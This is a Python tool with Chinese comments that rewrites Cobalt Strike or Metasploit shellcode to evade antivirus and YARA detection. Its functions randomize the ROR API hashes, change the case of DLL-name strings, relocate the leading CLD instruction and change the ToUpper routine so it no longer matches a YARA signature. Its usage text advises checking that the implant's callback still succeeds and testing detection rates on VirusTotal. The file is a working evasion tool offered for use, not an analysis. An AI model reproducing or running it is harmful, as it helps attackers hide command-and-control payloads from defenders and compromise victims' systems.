#!/usr/bin/env python3
"""
零检测 API 哈希随机化工具 - 增强版
基于 Huntress 研究,实现完整的零检测绕过

功能:
1. API 哈希随机化 (原始功能)
2. DLL 名称大写化 (新增)
3. CLD 指令移动 (新增)
4. 完整性验证

作者: Enhanced by AI
版本: 2.0
"""

import sys
import random
import re
import argparse
import logging
from pathlib import Path

# 设置日志
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


# ============================================================================
# 核心哈希算法
# ============================================================================

def ror(total, j):
    """计算 32 位循环右移"""
    return ((total >> (j % 32)) | (total << (32 - (j % 32)))) & 0xffffffff


def gethash(name, r):
    """计算 ROR 哈希"""
    result = 0
    for i in name:
        result = ror(result, r)
        result += i
    return result & 0xffffffff


def compute_hashes(dllname, export_list, r):
    """计算 DLL 中所有导出函数的哈希"""
    pad = dllname + "\0"
    dlln = pad.upper().encode('utf-16-le')
    dllhash = gethash(dlln, r)
    
    hash_dict = {}
    for api in export_list:
        h = gethash((api + "\0").encode('utf-8'), r)
        final = (dllhash + h) & 0xffffffff
        hash_dict[api] = final
    
    return hash_dict


# ============================================================================
# 零检测绕过功能
# ============================================================================

def randomize_dll_case(shellcode, dll_names=None, verbose=False):
    """
    DLL 名称大写化 - 破坏栈字符串特征
    
    Args:
        shellcode: 原始 shellcode (bytes)
        dll_names: DLL 名称列表
        verbose: 详细输出
    
    Returns:
        修改后的 shellcode (bytes)
    """
    if dll_names is None:
        # 完整的 DLL 名称列表 (不含 .dll 后缀)
        # 这些是 Cobalt Strike / Metasploit shellcode 常用的 DLL
        dll_names = [
            'wininet',    # HTTP/FTP 网络
            'winhttp',    # HTTP 客户端
            'kernel32',   # 核心 Windows API
            'ntdll',      # 系统调用
            'advapi32',   # 注册表/安全
            'ws2_32',     # Winsock 网络
            'dnsapi',     # DNS 查询
            'user32',     # GUI/窗口
            'shell32',    # Shell 操作
            'ole32',      # COM
            'crypt32',    # 加密
            'psapi',      # 进程信息
            'iphlpapi',   # IP Helper
            'netapi32',   # 网络管理
            'urlmon',     # URL Moniker
            'msvcrt',     # C 运行时
        ]
    
    shellcode_array = bytearray(shellcode)
    modified_count = 0
    
    for dll_name in dll_names:
        # 搜索 DLL 名称 (小写)
        dll_bytes = dll_name.lower().encode('utf-8')
        
        offset = 0
        while True:
            pos = shellcode_array.find(dll_bytes, offset)
            if pos == -1:
                break
            
            # 随机选择 1-3 个字符大写化
            num_to_upper = random.randint(1, min(3, len(dll_name)))
            positions_to_upper = random.sample(range(len(dll_name)), num_to_upper)
            
            original = dll_bytes.decode('utf-8')
            modified = list(original)
            
            for i in positions_to_upper:
                if modified[i].islower():
                    modified[i] = modified[i].upper()
                    shellcode_array[pos + i] = ord(modified[i])
            
            modified_str = ''.join(modified)
            if verbose:
                logger.info(f"  位置 {pos}: '{original}' → '{modified_str}'")
            
            modified_count += 1
            offset = pos + 1
    
    if modified_count > 0:
        logger.info(f"✓ DLL 名称大写化: 修改了 {modified_count} 处")
    else:
        logger.warning("⚠ 未找到需要大写化的 DLL 名称")
    
    return bytes(shellcode_array)


def find_first_string_operation(shellcode, start=0, end=None):
    """
    查找第一个字符串操作指令的位置
    
    Args:
        shellcode: shellcode 字节数组
        start: 开始搜索位置
        end: 结束位置 (None 则搜索到末尾)
    
    Returns:
        第一个字符串操作的位置,未找到则返回 None
    """
    if end is None:
        end = min(200, len(shellcode))  # 只搜索前 200 字节
    
    # 字符串操作指令列表
    STRING_OPS = {
        0xac: 'lodsb',
        0xad: 'lodsw/lodsd/lodsq',
        0xaa: 'stosb',
        0xab: 'stosw/stosd/stosq',
        0xa4: 'movsb',
        0xa5: 'movsw/movsd/movsq',
        0xae: 'scasb',
        0xaf: 'scasw/scasd/scasq',
        0xa6: 'cmpsb',
        0xa7: 'cmpsw/cmpsd/cmpsq',
    }
    
    # REP 前缀
    REP_PREFIXES = {0xf2: 'repne', 0xf3: 'rep'}
    
    for i in range(start, end):
        byte = shellcode[i]
        
        # 检查 REP 前缀
        if byte in REP_PREFIXES:
            if i + 1 < end and shellcode[i + 1] in STRING_OPS:
                return i  # 返回 REP 前缀的位置
        
        # 检查字符串操作指令
        if byte in STRING_OPS:
            return i
    
    return None


def move_cld_instruction(shellcode, arch, safe_offset=None, verbose=False):
    """
    移动 CLD 指令 - 破坏首指令特征 (改进版 - 带字符串操作检测)
    
    Args:
        shellcode: 原始 shellcode (bytes)
        arch: 架构 (32/64/x86/x64)
        safe_offset: 手动指定安全位置
        verbose: 详细输出
    
    Returns:
        修改后的 shellcode (bytes), 是否成功
    """
    shellcode_array = bytearray(shellcode)
    
    # 检查第一个字节是否为 CLD (0xfc)
    if shellcode_array[0] != 0xfc:
        logger.warning(f"⚠ 首字节不是 CLD (0xfc), 而是 {hex(shellcode_array[0])}")
        logger.warning("  跳过 CLD 移动步骤")
        return shellcode, False
    
    # === 步骤 1: 查找第一个字符串操作 ===
    first_string_op = find_first_string_operation(shellcode_array, start=1)
    
    if first_string_op:
        logger.info(f"  检测到第一个字符串操作在位置 {first_string_op}")
        if verbose:
            op_byte = shellcode_array[first_string_op]
            STRING_OPS = {
                0xac: 'lodsb', 0xad: 'lodsw/lodsd/lodsq',
                0xaa: 'stosb', 0xab: 'stosw/stosd/stosq',
                0xa4: 'movsb', 0xa5: 'movsw/movsd/movsq',
                0xae: 'scasb', 0xaf: 'scasw/scasd/scasq',
                0xa6: 'cmpsb', 0xa7: 'cmpsw/cmpsd/cmpsq',
                0xf2: 'repne', 0xf3: 'rep'
            }
            op_name = STRING_OPS.get(op_byte, f'0x{op_byte:02x}')
            logger.info(f"    指令: {op_name}")
    else:
        logger.warning("  未检测到字符串操作指令 (搜索前 200 字节)")
        logger.warning("  将使用默认策略")
        # 假设字符串操作在位置 50 之后
        first_string_op = 50
    
    # === 步骤 2: 确定安全位置 ===
    if safe_offset is None:
        # 自动查找安全位置
        # 策略: 在栈帧设置之后,但在字符串操作之前
        
        max_search = min(first_string_op - 1, 50)  # 最多搜索到字符串操作前一个位置
        
        if arch in ["64", "x64"]:
            # x64: 查找 pop rbp (0x5d) 或 pop r9 (0x41 0x51)
            for i in range(1, max_search):
                if shellcode_array[i] == 0x5d:  # pop rbp
                    safe_offset = i + 1
                    if verbose:
                        logger.info(f"  找到 pop rbp 在位置 {i}")
                    break
                elif i < len(shellcode_array) - 1 and \
                     shellcode_array[i] == 0x41 and shellcode_array[i+1] == 0x51:  # pop r9
                    safe_offset = i + 2
                    if verbose:
                        logger.info(f"  找到 pop r9 在位置 {i}")
                    break
        else:
            # x86: 查找 pop ebp (0x5d)
            for i in range(1, max_search):
                if shellcode_array[i] == 0x5d:  # pop ebp
                    safe_offset = i + 1
                    if verbose:
                        logger.info(f"  找到 pop ebp 在位置 {i}")
                    break
        
        # 如果还是没找到,使用最小移动策略
        if safe_offset is None:
            safe_offset = 1  # 最小移动,插入到位置 1
            logger.info("  使用最小移动策略 (位置 1)")
    
    # === 步骤 3: 验证安全性 ===
    if safe_offset >= first_string_op:
        logger.error(f"✗ 安全位置 {safe_offset} 在字符串操作 {first_string_op} 之后!")
        logger.error("  CLD 必须在字符串操作之前执行")
        logger.error("  建议:")
        logger.error(f"    1. 手动指定更早的位置: --cld-offset <N> (N < {first_string_op})")
        logger.error("    2. 或跳过 CLD 移动")
        return shellcode, False
    
    # === 步骤 4: 验证位置有效 ===
    if safe_offset >= len(shellcode_array):
        logger.error(f"✗ 安全位置 {safe_offset} 超出范围 (shellcode 长度: {len(shellcode_array)})")
        return shellcode, False
    
    # === 步骤 5: 查找可替换的字节 ===
    # 重要: 不能使用 insert()! 这会改变 shellcode 大小,导致相对跳转损坏
    # 必须找到一个可以安全替换的字节位置
    
    # 策略: 查找可替换的 NOP 或者在 safe_offset 位置进行安全替换
    # 如果 safe_offset 位置的字节可以被移到其他地方,或者可以合并操作
    
    # 检查 safe_offset 位置的原始字节
    original_byte = shellcode_array[safe_offset]
    
    # 方案 A: 如果 safe_offset 位置是 NOP (0x90),直接替换
    if original_byte == 0x90:
        logger.info(f"  位置 {safe_offset} 是 NOP,可以直接替换")
        shellcode_array[0] = 0x90  # 首字节改为 NOP
        shellcode_array[safe_offset] = 0xfc  # 替换为 CLD
        
    # 方案 B: 如果首字节后面有 NOP,交换位置
    elif shellcode_array[1] == 0x90:
        logger.warning("  首字节后有 NOP,使用交换策略")
        shellcode_array[0] = 0x90  # 首字节改为 NOP
        shellcode_array[1] = 0xfc  # 第二字节改为 CLD
        safe_offset = 1  # 更新实际位置
        
    # 方案 C: 最安全的做法 - 只移动 CLD 到位置 1,不改变大小
    else:
        # 这是最保守的方案:
        # 原始: fc xx yy ...
        # 修改: 90 fc xx yy ... (但这会增加大小!)
        # 
        # 正确的做法: 使用等效的指令序列
        # 或者: 只在首字节放 NOP,不移动 CLD
        
        logger.warning("⚠ CLD 移动可能影响 shellcode 功能!")
        logger.warning("  原因: 没有找到可以安全替换的位置")
        logger.warning("  采用保守策略: 只修改首字节为 NOP,保留原位置的 CLD")
        
        # 保守策略: 检查是否可以在不改变大小的情况下移动
        # 如果做不到,就跳过 CLD 移动
        
        # 尝试查找 shellcode 中已有的 NOP 可以替换
        nop_positions = []
        for i in range(1, min(safe_offset + 10, len(shellcode_array))):
            if shellcode_array[i] == 0x90:
                nop_positions.append(i)
        
        if nop_positions:
            # 找到了 NOP,可以替换
            nop_pos = nop_positions[0]
            if nop_pos < first_string_op:
                shellcode_array[0] = 0x90  # 首字节改为 NOP  
                shellcode_array[nop_pos] = 0xfc  # 将 NOP 替换为 CLD
                safe_offset = nop_pos
                logger.info(f"  找到 NOP 在位置 {nop_pos},替换为 CLD")
            else:
                logger.error("✗ 无法安全移动 CLD (NOP 在字符串操作之后)")
                logger.error("  建议: 跳过 CLD 移动,使用其他绕过技术")
                return shellcode, False
        else:
            # 没有找到 NOP,无法安全移动
            logger.error("✗ 无法安全移动 CLD!")
            logger.error("  原因: 没有可用的 NOP 位置,插入会破坏相对跳转")
            logger.error("  建议:")
            logger.error("    1. 跳过 CLD 移动 (不使用 --move-cld)")
            logger.error("    2. 只使用其他绕过技术 (--uppercase-dlls --transform-toupper)")
            return shellcode, False
    
    logger.info(f"✓ CLD 指令移动: 位置 0 → 位置 {safe_offset}")
    logger.info(f"  安全性验证: {safe_offset} < {first_string_op} (字符串操作) ✓")
    logger.info(f"  大小验证: 保持不变 ({len(shellcode_array)} 字节) ✓")
    
    if verbose:
        logger.info(f"  首字节: 0xfc → 0x90 (NOP)")
        logger.info(f"  位置 {safe_offset}: → 0xfc (CLD)")
        logger.info(f"  保证 CLD 在所有字符串操作之前执行")
        logger.info(f"  保证 shellcode 大小不变 (相对跳转安全)")
    
    return bytes(shellcode_array), True


def transform_toupper_function(shellcode, verbose=False):
    """
    变形 ToUpper 函数 - 绕过 YARA 检测
    
    YARA 检测特征: ac 3c 61 7c ?? 2c 20
    (lodsb; cmp al, 0x61; jl skip; sub al, 0x20)
    
    修改策略: 将 SUB al, 0x20 改为 XOR al, 0x20
    原始: ac 3c 61 7c ?? 2c 20
    修改: ac 3c 61 7c ?? 34 20
    
    Args:
        shellcode: 原始 shellcode (bytes)
        verbose: 详细输出
    
    Returns:
        修改后的 shellcode (bytes)
    """
    shellcode_array = bytearray(shellcode)
    modified_count = 0
    
    # 查找 ToUpper 函数特征
    # ac 3c 61 7c - lodsb; cmp al, 0x61; jl
    pattern_prefix = b'\xac\x3c\x61\x7c'
    
    offset = 0
    while True:
        pos = shellcode_array.find(pattern_prefix, offset)
        if pos == -1:
            break
        
        # 检查后面是否是 SUB al, 0x20 (2c 20)
        # 格式: ac 3c 61 7c [offset] 2c 20
        if pos + 6 < len(shellcode_array):
            # pos+4 是跳转偏移
            # pos+5 应该是 0x2c (SUB)
            # pos+6 应该是 0x20
            if shellcode_array[pos + 5] == 0x2c and shellcode_array[pos + 6] == 0x20:
                # 替换为 XOR al, 0x20 (34 20)
                shellcode_array[pos + 5] = 0x34
                
                if verbose:
                    logger.info(f"  位置 {pos}: SUB al, 0x20 → XOR al, 0x20")
                    logger.info(f"    字节: 2c 20 → 34 20")
                
                modified_count += 1
        
        offset = pos + 1
    
    if modified_count > 0:
        logger.info(f"✓ ToUpper 函数变形: 修改了 {modified_count} 处")
        logger.info(f"  绕过 YARA 特征: $toUpper")
    else:
        logger.warning("⚠ 未找到 ToUpper 函数特征")
        logger.warning("  shellcode 可能不使用标准的 ROR 哈希实现")
    
    return bytes(shellcode_array)


def verify_shellcode_integrity(original, modified, verbose=False):
    """
    验证 shellcode 完整性
    
    Args:
        original: 原始 shellcode
        modified: 修改后的 shellcode
        verbose: 详细输出
    
    Returns:
        验证结果字典
    """
    checks = {
        'passed': True,
        'warnings': [],
        'errors': []
    }
    
    # === 1. 大小检查 ===
    size_original = len(original)
    size_modified = len(modified)
    size_diff = size_modified - size_original
    
    # 重要: 修改后的 shellcode 大小应该与原始完全相同!
    # 如果大小改变了,说明有问题 (可能会破坏相对跳转)
    if size_diff == 0:
        checks['size_status'] = '✓ 大小相同'
    else:
        # 大小改变是严重错误!
        checks['size_status'] = f'✗ 大小改变! ({size_diff:+d} 字节)'
        checks['errors'].append(f'Shellcode 大小改变了 {abs(size_diff)} 字节')
        checks['errors'].append('这可能导致相对跳转损坏!')
        checks['passed'] = False
    
    checks['size_original'] = size_original
    checks['size_modified'] = size_modified
    
    # === 2. ROR 指令检查 ===
    ror_patterns = {
        'x64': b'\xc1\xc9',
        'x86': b'\xc1\xcf'
    }
    
    ror_found = []
    for arch, pattern in ror_patterns.items():
        if pattern in modified:
            ror_found.append(arch)
    
    if ror_found:
        checks['ror_status'] = f"✓ 存在 ({', '.join(ror_found)})"
        checks['ror_instructions'] = ror_found
    else:
        checks['ror_status'] = '✗ 未找到'
        checks['errors'].append('ROR 指令未找到,shellcode 可能已损坏')
        checks['passed'] = False
    
    # === 3. 修改统计 ===
    min_len = min(size_original, size_modified)
    diff_count = sum(1 for i in range(min_len) if original[i] != modified[i])
    
    # 额外字节(如果有)
    if size_modified > size_original:
        diff_count += size_modified - size_original
    
    modification_rate = (diff_count / size_original) * 100
    
    checks['bytes_modified'] = diff_count
    checks['modification_rate'] = modification_rate
    
    # 修改率检查
    if modification_rate < 0.5:
        checks['modification_status'] = '⚠ 修改率过低'
        checks['warnings'].append('修改的字节数很少,可能未正确修改')
    elif modification_rate > 20:
        checks['modification_status'] = '⚠ 修改率过高'
        checks['warnings'].append('修改的字节数过多,可能存在问题')
    else:
        checks['modification_status'] = '✓ 正常'
    
    # === 4. 可疑模式检查 ===
    max_repeat = 0
    current_repeat = 1
    prev_byte = modified[0] if len(modified) > 0 else 0
    
    for byte in modified[1:]:
        if byte == prev_byte:
            current_repeat += 1
            max_repeat = max(max_repeat, current_repeat)
        else:
            current_repeat = 1
        prev_byte = byte
    
    checks['max_consecutive_bytes'] = max_repeat
    
    if max_repeat > 100:
        checks['pattern_status'] = '✗ 可疑'
        checks['errors'].append(f'发现 {max_repeat} 个连续相同字节')
        checks['passed'] = False
    elif max_repeat > 50:
        checks['pattern_status'] = '⚠ 注意'
        checks['warnings'].append(f'发现 {max_repeat} 个连续相同字节')
    else:
        checks['pattern_status'] = '✓ 正常'
    
    # === 5. 空字节检查 ===
    null_count = modified.count(0x00)
    null_percentage = (null_count / len(modified)) * 100
    
    checks['null_bytes'] = null_count
    checks['null_percentage'] = null_percentage
    
    if null_percentage > 50:
        checks['null_status'] = '⚠ 过多'
        checks['warnings'].append(f'空字节占比 {null_percentage:.1f}%')
    else:
        checks['null_status'] = '✓ 正常'
    
    # === 6. ToUpper 变形检查 ===
    # 检查是否有 XOR al, 0x20 (我们的变形)
    xor_pattern = b'\x34\x20'
    sub_pattern = b'\x2c\x20'
    
    xor_count = modified.count(xor_pattern)
    sub_count = modified.count(sub_pattern)
    
    if xor_count > 0:
        checks['toupper_status'] = f'✓ 已变形 (XOR: {xor_count})'
        checks['toupper_transformed'] = True
    elif sub_count > 0:
        checks['toupper_status'] = f'⚠ 未变形 (SUB: {sub_count})'
        checks['toupper_transformed'] = False
    else:
        checks['toupper_status'] = '- 无此特征'
        checks['toupper_transformed'] = None
    
    # === 输出结果 ===
    logger.info("\n验证结果:")
    logger.info("-" * 50)
    
    # 基本信息
    logger.info(f"大小: {size_original} → {size_modified} 字节 {checks['size_status']}")
    logger.info(f"修改: {diff_count} 字节 ({modification_rate:.2f}%) {checks['modification_status']}")
    
    # 关键检查
    logger.info(f"ROR 指令: {checks['ror_status']}")
    logger.info(f"可疑模式: {checks['pattern_status']}")
    logger.info(f"空字节: {null_count} ({null_percentage:.1f}%) {checks['null_status']}")
    
    # ToUpper 变形
    if checks.get('toupper_transformed') is not None:
        logger.info(f"ToUpper: {checks['toupper_status']}")
    
    # 详细信息(verbose 模式)
    if verbose:
        logger.info("\n详细信息:")
        logger.info(f"  最大连续字节: {max_repeat}")
        logger.info(f"  修改率: {modification_rate:.4f}%")
        if ror_found:
            logger.info(f"  ROR 架构: {', '.join(ror_found)}")
    
    # 警告和错误
    if checks['warnings']:
        logger.info("\n⚠ 警告:")
        for warning in checks['warnings']:
            logger.info(f"  - {warning}")
    
    if checks['errors']:
        logger.info("\n✗ 错误:")
        for error in checks['errors']:
            logger.info(f"  - {error}")
    
    # 总体评估
    logger.info("\n总体评估:")
    if checks['passed'] and len(checks['warnings']) == 0:
        logger.info("  ✓✓✓ 完美! Shellcode 完整性良好")
    elif checks['passed']:
        logger.info(f"  ✓ 通过 (有 {len(checks['warnings'])} 个警告)")
    else:
        logger.info(f"  ✗ 失败 (有 {len(checks['errors'])} 个错误)")
    
    return checks


# ============================================================================
# 原始 API 哈希随机化功能
# ============================================================================

# API 列表 - 动态加载所有 DLL
try:
    from apihash_lists import load_api_lists, DEFAULT_DLLS
    
    # 动态加载所有 DLL 的 API 列表
    _dll_exports = None
    
    def get_dll_exports(verbose=False):
        """获取所有 DLL 的导出函数列表（延迟加载）"""
        global _dll_exports
        if _dll_exports is None:
            _dll_exports = load_api_lists(verbose=verbose)
            if not _dll_exports or all(len(v) == 0 for v in _dll_exports.values()):
                logger.warning("API 列表为空,请确保已安装 pefile: pip install pefile")
                logger.warning("或运行: python dll_parser.py 生成缓存")
        return _dll_exports
    
except ImportError as e:
    logger.error(f"无法导入 API 列表: {e}")
    logger.error("请确保 apihash_lists.py 和 dll_parser.py 在同一目录")
    sys.exit(1)


def randomize_api_hashes(shellcode, arch, old_ror=None, new_ror=None, verbose=False):
    """
    API 哈希随机化 (原始功能)
    
    Args:
        shellcode: 原始 shellcode
        arch: 架构
        old_ror: 旧 ROR 值 (None 则自动检测)
        new_ror: 新 ROR 值 (None 则随机生成)
        verbose: 详细输出
    
    Returns:
        修改后的 shellcode, 统计信息
    """
    shellcode_array = bytearray(shellcode)
    
    # 检测旧 ROR 值
    if old_ror is None:
        try:
            if arch in ["32", "x86"]:
                detectror = re.search(b'\xc1\xcf', shellcode_array)
            elif arch in ["64", "x64"]:
                detectror = re.search(b'\xc1\xc9', shellcode_array)
            
            if detectror:
                offset = detectror.start() + 2
                old_ror = shellcode_array[offset]
                logger.info(f"检测到 ROR 值: {hex(old_ror)}")
            else:
                logger.warning("未检测到 ROR 指令,假设默认值 0xd (13)")
                old_ror = 13
        except:
            logger.warning("ROR 检测失败,假设默认值 0xd (13)")
            old_ror = 13
    
    # 生成新 ROR 值
    if new_ror is None:
        new_ror = random.randint(1, 255)
        while (new_ror % 32 == old_ror % 32):
            new_ror = random.randint(1, 255)
    
    logger.info(f"新 ROR 值: {hex(new_ror)}")
    
    # 动态加载所有 DLL 的 API 列表
    dll_exports = get_dll_exports(verbose=verbose)
    
    if not dll_exports:
        logger.error("✗ 无法加载 API 列表")
        return shellcode, None
    
    logger.info(f"加载了 {len(dll_exports)} 个 DLL 的 API 列表")
    
    # 计算所有 DLL 的旧/新哈希
    old_hashes_all = {}
    new_hashes_all = {}
    
    for dll_name, api_list in dll_exports.items():
        if api_list:  # 跳过空列表
            old_hashes_all[dll_name] = compute_hashes(dll_name, api_list, old_ror)
            new_hashes_all[dll_name] = compute_hashes(dll_name, api_list, new_ror)
    
    # 替换哈希
    matchlist = []
    dll_match_counts = {}  # 统计每个 DLL 匹配的 API 数
    
    for dll_name in old_hashes_all.keys():
        old_hashes = old_hashes_all[dll_name]
        new_hashes = new_hashes_all[dll_name]
        dll_match_count = 0
        
        for api in old_hashes.keys():
            o = old_hashes[api].to_bytes(4, 'little')
            n = new_hashes[api].to_bytes(4, 'little')
            
            if o in shellcode_array:
                shellcode_array = bytearray(bytes(shellcode_array).replace(o, n))
                matchlist.append(f"{dll_name}::{api}")
                dll_match_count += 1
                if verbose:
                    logger.debug(f"  {dll_name}::{api}")
        
        if dll_match_count > 0:
            dll_match_counts[dll_name] = dll_match_count
    
    if len(matchlist) == 0:
        logger.error("✗ 未找到任何 API 哈希")
        logger.error("  请检查 shellcode 是否使用 ROR 哈希")
        return shellcode, None
    
    logger.info(f"✓ API 哈希替换: 发现 {len(matchlist)} 个 API")
    
    # 显示每个 DLL 的匹配统计
    if dll_match_counts and verbose:
        logger.info("  DLL 匹配统计:")
        for dll_name, count in sorted(dll_match_counts.items(), key=lambda x: -x[1]):
            logger.info(f"    {dll_name}: {count} 个 API")
    
    # 更新 ROR 指令
    if arch in ["32", "x86"]:
        shellcode_array = bytearray(bytes(shellcode_array).replace(
            b'\xc1\xcf' + old_ror.to_bytes(1, 'little'),
            b'\xc1\xcf' + new_ror.to_bytes(1, 'little')
        ))
    elif arch in ["64", "x64"]:
        shellcode_array = bytearray(bytes(shellcode_array).replace(
            b'\xc1\xc9' + old_ror.to_bytes(1, 'little'),
            b'\xc1\xc9' + new_ror.to_bytes(1, 'little')
        ))
    
    stats = {
        'old_ror': old_ror,
        'new_ror': new_ror,
        'api_count': len(matchlist),
        'apis': matchlist,
        'dll_stats': dll_match_counts,  # 每个 DLL 匹配的 API 数
        'dll_count': len(dll_match_counts)  # 匹配了 API 的 DLL 数量
    }
    
    return bytes(shellcode_array), stats


# ============================================================================
# 主函数
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='零检测 API 哈希随机化工具 - 增强版',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
示例:
  # 基础用法 (仅 API 哈希随机化)
  python %(prog)s -a x64 -i beacon.bin
  
  # 完整零检测绕过
  python %(prog)s -a x64 -i beacon.bin --zero-detection
  
  # 手动指定 CLD 位置
  python %(prog)s -a x64 -i beacon.bin --zero-detection --cld-offset 12
  
  # 详细输出
  python %(prog)s -a x64 -i beacon.bin --zero-detection -v
        '''
    )
    
    parser.add_argument('-a', '--arch', required=True,
                        choices=['32', '64', 'x86', 'x64'],
                        help='架构 (32/64/x86/x64)')
    
    parser.add_argument('-i', '--input', required=True,
                        help='输入 shellcode 文件')
    
    parser.add_argument('-o', '--output',
                        help='输出文件 (默认: input_0xNN.bin)')
    
    parser.add_argument('--zero-detection', action='store_true',
                        help='启用零检测绕过 (DLL 大写化 + CLD 移动 + YARA 绕过)')
    
    parser.add_argument('--evade-yara', action='store_true',
                        help='启用 YARA 绕过 (ToUpper 函数变形)')
    
    parser.add_argument('--uppercase-dlls', action='store_true',
                        help='仅启用 DLL 名称大写化')
    
    parser.add_argument('--move-cld', action='store_true',
                        help='仅启用 CLD 指令移动')
    
    parser.add_argument('--transform-toupper', action='store_true',
                        help='仅启用 ToUpper 函数变形')
    
    parser.add_argument('--cld-offset', type=int,
                        help='手动指定 CLD 安全位置')
    
    parser.add_argument('--ror-value', type=int,
                        help='手动指定新 ROR 值 (默认: 随机)')
    
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='详细输出')
    
    parser.add_argument('--no-backup', action='store_true',
                        help='不创建备份文件')
    
    args = parser.parse_args()
    
    # 设置日志级别
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # 读取 shellcode
    input_path = Path(args.input)
    if not input_path.exists():
        logger.error(f"✗ 文件不存在: {args.input}")
        return 1
    
    logger.info(f"读取 shellcode: {args.input}")
    with open(input_path, 'rb') as f:
        original_shellcode = f.read()
    
    logger.info(f"  大小: {len(original_shellcode)} 字节")
    
    # 备份
    if not args.no_backup:
        backup_path = input_path.with_suffix(input_path.suffix + '.bak')
        with open(backup_path, 'wb') as f:
            f.write(original_shellcode)
        logger.info(f"✓ 已创建备份: {backup_path}")
    
    # 处理 shellcode
    modified_shellcode = original_shellcode
    stats = {}
    
    # 步骤 1: API 哈希随机化
    logger.info("\n步骤 1: API 哈希随机化")
    logger.info("=" * 50)
    modified_shellcode, hash_stats = randomize_api_hashes(
        modified_shellcode,
        args.arch,
        new_ror=args.ror_value,
        verbose=args.verbose
    )
    
    if hash_stats is None:
        logger.error("✗ API 哈希随机化失败")
        return 1
    
    stats.update(hash_stats)
    
    # 步骤 2: DLL 名称大写化 (可选)
    if args.zero_detection or args.uppercase_dlls:
        logger.info("\n步骤 2: DLL 名称大写化")
        logger.info("=" * 50)
        modified_shellcode = randomize_dll_case(
            modified_shellcode,
            verbose=args.verbose
        )
    
    # 步骤 3: CLD 指令移动 (可选)
    if args.zero_detection or args.move_cld:
        logger.info("\n步骤 3: CLD 指令移动")
        logger.info("=" * 50)
        modified_shellcode, cld_success = move_cld_instruction(
            modified_shellcode,
            args.arch,
            safe_offset=args.cld_offset,
            verbose=args.verbose
        )
        stats['cld_moved'] = cld_success
    
    # 步骤 3.5: ToUpper 函数变形 (YARA 绕过)
    if args.zero_detection or args.evade_yara or args.transform_toupper:
        logger.info("\n步骤 3.5: ToUpper 函数变形 (YARA 绕过)")
        logger.info("=" * 50)
        modified_shellcode = transform_toupper_function(
            modified_shellcode,
            verbose=args.verbose
        )
        stats['toupper_transformed'] = True
    
    # 步骤 4: 验证完整性
    logger.info("\n步骤 4: 完整性验证")
    logger.info("=" * 50)
    integrity = verify_shellcode_integrity(
        original_shellcode,
        modified_shellcode,
        verbose=args.verbose
    )
    
    # 检查是否有严重错误
    if not integrity['passed']:
        logger.error("\n✗ 完整性验证失败!")
        logger.error("  建议检查 shellcode 或使用备份文件恢复")
        # 不退出,继续保存文件但给出警告
    
    # 保存
    if args.output:
        output_path = Path(args.output)
    else:
        output_path = input_path.with_name(
            f"{input_path.stem}_{hex(stats['new_ror'])}{input_path.suffix}"
        )
    
    with open(output_path, 'wb') as f:
        f.write(modified_shellcode)
    
    # 最终报告
    logger.info("\n" + "=" * 50)
    logger.info("✓ 处理完成!")
    logger.info("=" * 50)
    logger.info(f"旧 ROR 值: {hex(stats['old_ror'])}")
    logger.info(f"新 ROR 值: {hex(stats['new_ror'])}")
    logger.info(f"API 数量: {stats['api_count']}")
    logger.info(f"原始大小: {len(original_shellcode)} 字节")
    logger.info(f"修改大小: {len(modified_shellcode)} 字节")
    logger.info(f"输出文件: {output_path}")
    
    if args.zero_detection:
        logger.info("\n零检测绕过技术:")
        logger.info("  ✓ API 哈希随机化")
        logger.info("  ✓ DLL 名称大写化")
        logger.info(f"  {'✓' if stats.get('cld_moved') else '✗'} CLD 指令移动")
        logger.info(f"  {'✓' if stats.get('toupper_transformed') else '✗'} ToUpper 函数变形 (YARA 绕过)")
    
    logger.info("\n建议:")
    logger.info("  1. 在隔离环境中测试 shellcode 功能")
    logger.info("  2. 验证回连是否成功")
    logger.info("  3. (可选) 上传到 VirusTotal 测试检测率")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
